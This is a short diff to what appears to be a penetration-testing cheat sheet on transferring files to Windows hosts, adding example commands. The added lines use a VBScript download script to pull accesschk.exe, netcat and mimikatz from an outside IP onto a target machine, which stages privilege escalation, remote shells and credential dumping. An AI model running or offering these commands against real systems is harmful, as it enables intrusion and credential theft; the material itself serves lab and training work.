@@ -36,6 +36,13 @@ echo ts.Close >> wget.vbs
 
 > cscript wget.vbs http://YOURIP/file_to_send.txt C:\save\file\here.txt
 
+> cscript wget.vbs http://10.11.0.125/accesschk.exe C:\accesschk.exe
+
+> cscript wget.vbs http://10.11.0.125/nc.exe C:\nc.exe
+
+> cscript wget.vbs http://10.11.0.125/mimikatz.exe C:\mimikatz.exe
+
+
 ## Powershell
 
 ```
